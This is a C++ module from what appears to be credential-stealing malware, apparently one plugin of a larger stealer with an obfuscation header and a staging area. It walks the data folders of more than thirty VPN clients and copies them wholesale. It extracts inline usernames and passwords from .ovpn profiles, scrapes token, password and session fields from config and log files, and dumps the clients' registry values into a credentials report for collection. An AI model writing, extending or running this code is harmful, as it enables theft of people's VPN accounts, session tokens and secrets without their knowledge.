// VPN clients: configs, saved sessions and the credentials that go with them.
// Besides copying each client's data directories, this module extracts the
// actual sign-in material: inline auth-user-pass blocks from .ovpn profiles,
// user/token/password/session fields from settings JSON, INI and log files,
// and string values from the registry keys clients keep credentials in.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <windows.h>
#include <cstring>
#include <set>
#include <sstream>

namespace {

struct VpnTarget { const char* name; const char* path; const char* pattern; };

// Full data trees (not just config folders): the Connect/Nord/Proton clients
// keep their saved sessions and tokens next to the configs.
const VpnTarget k_vpns[] = {
    {"OpenVPN config", "%APPDATA%\\OpenVPN\\config", "*"},
    {"OpenVPN programdata", "%PROGRAMDATA%\\OpenVPN\\config", "*"},
    {"OpenVPN profile", "%USERPROFILE%\\OpenVPN\\config", "*"},
    {"OpenVPN Connect", "%LOCALAPPDATA%\\OpenVPN Connect", "*"},
    {"OpenVPN Connect roaming", "%APPDATA%\\OpenVPN Connect", "*"},
    {"NordVPN", "%LOCALAPPDATA%\\NordVPN", "*"},
    {"NordVPN roaming", "%APPDATA%\\NordVPN", "*"},
    {"NordVPN programdata", "%PROGRAMDATA%\\NordVPN", "*"},
    {"ProtonVPN", "%LOCALAPPDATA%\\ProtonVPN", "*"},
    {"ProtonVPN roaming", "%APPDATA%\\ProtonVPN", "*"},
    {"ProtonVPN (new)", "%LOCALAPPDATA%\\Proton", "*"},
    {"WireGuard", "%APPDATA%\\WireGuard\\Configurations", "*"},
    {"WireGuard local", "%LOCALAPPDATA%\\WireGuard", "*"},
    {"Windscribe", "%APPDATA%\\Windscribe", "*"},
    {"Windscribe local", "%LOCALAPPDATA%\\Windscribe", "*"},
    {"Mullvad", "%APPDATA%\\Mullvad VPN", "*"},
    {"ExpressVPN", "%APPDATA%\\ExpressVPN", "*"},
    {"CyberGhost", "%APPDATA%\\CyberGhost", "*"},
    {"Surfshark", "%APPDATA%\\Surfshark", "*"},
    {"PIA", "%APPDATA%\\Private Internet Access", "*"},
    {"PIA local", "%LOCALAPPDATA%\\Private Internet Access", "*"},
    {"IPVanish", "%APPDATA%\\IPVanish", "*"},
    {"Ivacy", "%APPDATA%\\Ivacy", "*"},
    {"TunnelBear", "%APPDATA%\\TunnelBear", "*"},
    {"VyprVPN", "%APPDATA%\\VyprVPN", "*"},
    {"HMA", "%APPDATA%\\HMA! Pro VPN", "*"},
    {"PureVPN", "%APPDATA%\\PureVPN", "*"},
    {"Hotspot Shield", "%APPDATA%\\Hotspot Shield", "*"},
    {"Hide.me", "%APPDATA%\\Hide.me", "*"},
    {"Betternet", "%APPDATA%\\Betternet", "*"},
    {"Turbo VPN", "%APPDATA%\\Turbo VPN", "*"},
    {"VPNArea", "%APPDATA%\\VPNArea", "*"},
    {"AzireVPN", "%APPDATA%\\AzireVPN", "*"},
    {"HideMyAss", "%APPDATA%\\HMA VPN", "*"},
    {"SoftEther", "%APPDATA%\\SoftEther VPN Client", "*"},
    {"SoftEther local", "%LOCALAPPDATA%\\SoftEther VPN Client", "*"},
};

// Keys where clients persist sessions, tokens, account names.
const wchar_t* k_reg_keys[] = {
    L"Software\\NordVPN",       L"Software\\ProtonVPN", L"Software\\OpenVPN",
    L"Software\\OpenVPN-GUI",   L"Software\\OpenVPN Connect", L"Software\\Windscribe",
    L"Software\\Private Internet Access", L"Software\\Mullvad VPN",
    L"Software\\ExpressVPN",    L"Software\\Surfshark", L"Software\\IPVanish",
};

const char* k_needles[] = {
    "username", "user_name", "user", "login", "email", "account", "password",
    "passwd", "pwd", "token", "auth_token", "refresh_token", "access_token",
    "session", "secret", "api_key", "apikey", "private_key", "license",
};

bool is_cred_ext(const std::string& lower_name) {
    static const char* exts[] = {".json", ".ovpn",  ".conf", ".ini",  ".txt", ".log",
                                 ".xml",  ".cfg",   ".yaml", ".yml",  ".prop", ".properties",
                                 ".backup", ".old", ".dat"};
    for (auto* e : exts) {
        size_t l = strlen(e);
        if (lower_name.size() > l && lower_name.compare(lower_name.size() - l, l, e) == 0)
            return true;
    }
    return false;
}

bool looks_valuable(const std::string& v) {
    static const char* skip[] = {"true", "false", "null", "none", "auto", "default",
                                 "enabled", "disabled", "unknown", "yes", "no"};
    if (v.size() < 3 || v.size() > 240) return false;
    for (auto* s : skip)
        if (v == s) return false;
    bool has_word = false;
    for (char c : v)
        if (isalnum((unsigned char)c)) { has_word = true; break; }
    return has_word;
}

std::string combo_trim(const std::string& s) {
    size_t a = s.find_first_not_of(" \t\r\n");
    size_t b = s.find_last_not_of(" \t\r\n");
    return a == std::string::npos ? "" : s.substr(a, b - a + 1);
}

// extract `key = value` candidates from one line (json/ini/log tolerant)
void scan_line(const std::string& line, const std::string& lower, const char* needle,
               std::string& key_out, std::string& val_out) {
    size_t pos = 0;
    const size_t nlen = strlen(needle);
    while ((pos = lower.find(needle, pos)) != std::string::npos) {
        // skip index fields like "token_count"
        size_t after = pos + nlen;
        if (after < lower.size() && (isalnum((unsigned char)lower[after]) || lower[after] == '_')) {
            pos = after;
            continue;
        }
        if (pos > 0 && (isalnum((unsigned char)lower[pos - 1]) || lower[pos - 1] == '_')) {
            pos = after;
            continue;
        }
        // find the separator within the next few characters ("...":, =, :)
        size_t j = after;
        while (j < lower.size() && (lower[j] == ' ' || lower[j] == '"' || lower[j] == '\'' ||
                                    lower[j] == '\t'))
            ++j;
        if (j >= lower.size() || (lower[j] != ':' && lower[j] != '=')) {
            pos = after;
            continue;
        }
        ++j;
        while (j < line.size() && (line[j] == ' ' || line[j] == '"' || line[j] == '\'' ||
                                   line[j] == '\t' || line[j] == ':'))
            ++j;
        size_t k = j;
        while (k < line.size() && line[k] != '"' && line[k] != '\'' && line[k] != ',' &&
               line[k] != ';' && line[k] != '}' && line[k] != '\\' && line[k] != '\n' &&
               k - j < 240)
            ++k;
        std::string val = combo_trim(line.substr(j, k - j));
        if (looks_valuable(val)) {
            key_out = needle;
            val_out = val;
            return;
        }
        pos = after;
    }
}

// pull inline <auth-user-pass> user/password from an .ovpn body
bool ovpn_inline_creds(const std::string& body, std::string& user, std::string& pass) {
    auto tag = body.find("<auth-user-pass>");
    if (tag == std::string::npos) return false;
    auto end = body.find("</auth-user-pass>", tag);
    if (end == std::string::npos) return false;
    std::string block = body.substr(tag + 16, end - tag - 16);
    std::istringstream is(block);
    std::string u, p;
    std::getline(is, u);
    std::getline(is, p);
    user = combo_trim(u);
    pass = combo_trim(p);
    return !user.empty();
}

void append_registry(std::ostringstream& report, int& fields) {
    for (auto* key : k_reg_keys) {
        HKEY hk = nullptr;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, key, 0, KEY_READ, &hk) != ERROR_SUCCESS) continue;
        std::wstring wname(key);
        report << "== registry HKCU\\" << util::narrow(wname) << "\r\n";
        wchar_t vname[512];
        BYTE data[2048];
        for (DWORD i = 0; i < 64; ++i) {
            DWORD nlen = 512, dlen = sizeof(data), type = 0;
            if (RegEnumValueW(hk, i, vname, &nlen, nullptr, &type, data, &dlen) != ERROR_SUCCESS)
                break;
            if (type != REG_SZ && type != REG_EXPAND_SZ) continue;
            std::string v = util::narrow(std::wstring((wchar_t*)data, dlen / sizeof(wchar_t)));
            while (!v.empty() && v.back() == L'\0') v.pop_back();
            if (!looks_valuable(v)) continue;
            report << "  " << util::narrow(std::wstring(vname, nlen)) << " = " << v << "\r\n";
            ++fields;
        }
        RegCloseKey(hk);
    }
}

void scan_tree(const std::string& root, std::ostringstream& report, int& fields) {
    auto files = util::walk_files(root, 7);
    std::set<std::string> seen;
    int budget = 800;
    for (auto& f : files) {
        if (--budget <= 0) break;
        std::string lower_name = util::to_lower(util::filename_of(f));
        std::vector<uint8_t> data;
        if (!util::read_file(f, data) || data.empty() || data.size() > 2 * 1024 * 1024) continue;
        std::string body(data.begin(), data.end());

        // .ovpn: inline credentials first
        if (lower_name.size() > 5 && lower_name.compare(lower_name.size() - 5, 5, ".ovpn") == 0) {
            std::string u, p;
            if (ovpn_inline_creds(body, u, p)) {
                std::string key = f + "|inline";
                if (seen.insert(key).second) {
                    report << "  " << f << "\r\n    username = " << u << "\r\n    password = " << p
                           << "\r\n";
                    fields += 2;
                }
            }
            auto ref = body.find("auth-user-pass ");
            if (ref != std::string::npos) {
                std::string fn = combo_trim(body.substr(ref + 16, 120));
                auto cut = fn.find_first_of("\r\n");
                if (cut != std::string::npos) fn = fn.substr(0, cut);
                if (!fn.empty() && fn[0] != '<') {
                    report << "  " << f << "\r\n    auth-user-pass file: " << fn << "\r\n";
                    ++fields;
                }
            }
        }

        if (!is_cred_ext(lower_name)) continue;
        std::string lower = util::to_lower(body);
        // line-by-line scan, capped
        size_t pos = 0;
        int lines = 0;
        while (pos < body.size() && lines < 4000) {
            size_t nl = body.find('\n', pos);
            std::string line = body.substr(pos, nl == std::string::npos ? std::string::npos : nl - pos);
            std::string low_line = util::to_lower(line);
            if (line.size() < 200) {
                for (auto* needle : k_needles) {
                    std::string k, v;
                    scan_line(line, low_line, needle, k, v);
                    if (v.empty()) continue;
                    std::string uniq = f + "|" + k + "|" + v;
                    if (seen.insert(uniq).second) {
                        report << "  " << f << "\r\n    " << k << " = " << v << "\r\n";
                        ++fields;
                    }
                    break;  // one field per line is enough
                }
            }
            if (nl == std::string::npos) break;
            pos = nl + 1;
            ++lines;
        }
    }
}

} // namespace

namespace mod {

void vpn(const std::string& staging) {
    std::ostringstream summary, report;
    int hits = 0, fields = 0;
    for (auto& v : k_vpns) {
        std::string path = util::expand_env(v.path);
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        util::copy_dir_recursive(path, util::join(staging, "vpn\\" + std::string(v.name)),
                                 {v.pattern}, 64 * 1024 * 1024);
        summary << "  " << v.name << ": " << path << "\r\n";
        report << "\r\n== " << v.name << "  (" << path << ")\r\n";
        scan_tree(path, report, fields);
    }
    append_registry(report, fields);

    stage::stage_text("vpn", "_summary.txt", summary.str());
    if (fields > 0)
        stage::stage_text("vpn", "_credentials.txt", "vpn credential extraction\r\n" + report.str());
    stage::note("vpn", std::to_string(hits) + " clients found, " + std::to_string(fields) +
                           " credential fields extracted");
}

} // namespace mod
